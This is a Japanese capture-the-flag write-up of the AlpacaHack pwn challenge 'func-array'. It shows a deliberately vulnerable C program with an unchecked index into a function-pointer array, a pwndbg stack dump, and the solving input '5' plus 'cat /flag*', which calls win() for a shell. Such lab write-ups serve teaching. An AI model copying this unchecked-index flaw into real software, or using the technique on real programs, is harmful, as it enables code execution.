# func-array

https://alpacahack.com/daily/challenges/func-array

## 問題の概要

win 関数を呼び出せば shell が得られる PWN 問題です。

```c
int main() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);

	vuln();

	win();

	return 0;
}
```

`vuln` 関数は 0 ～ 2 の整数を入力すると `alpaca_functions` 配列の対応する関数を呼び出して終了します。

```c
void vuln() {
	void (*alpaca_functions[3])() = {
		alpaca_function0,
		alpaca_function1,
		alpaca_function2};

	unsigned int choice;
	printf("Select an alpaca function index: ");
	scanf("%u", &choice);

	alpaca_functions[choice]();

	exit(0);
}
```

## 解法

`alpaca_functions[choice]();` を呼び出す直前のスタックは次のようになっています。

```
pwndbg> break *vuln+122
pwndbg> run
...
pwndbg> stack 10
00:0000│ rsp 0x7fffffffe950 ◂— 0
01:0008│-028 0x7fffffffe958 ◂— 0x200000000
02:0010│-020 0x7fffffffe960 —▸ 0x4011d6 (alpaca_function0) ◂— endbr64
03:0018│-018 0x7fffffffe968 —▸ 0x4011f0 (alpaca_function1) ◂— endbr64
04:0020│-010 0x7fffffffe970 —▸ 0x40120a (alpaca_function2) ◂— endbr64
05:0028│-008 0x7fffffffe978 ◂— 0x64a06b05ef9aae00
06:0030│ rbp 0x7fffffffe980 —▸ 0x7fffffffe990 ◂— 1
07:0038│+008 0x7fffffffe988 —▸ 0x40132b (main+78) ◂— mov eax, 0
08:0040│+010 0x7fffffffe990 ◂— 1
09:0048│+018 0x7fffffffe998 —▸ 0x7ffff7decca8 ◂— mov edi, eax
```

`choice` に 5 を指定すれば `vuln` 関数のリターンアドレス `main+78` が呼び出され、`win()` が実行されます。

## 解答に使用した入力

```
5
cat /flag*
```
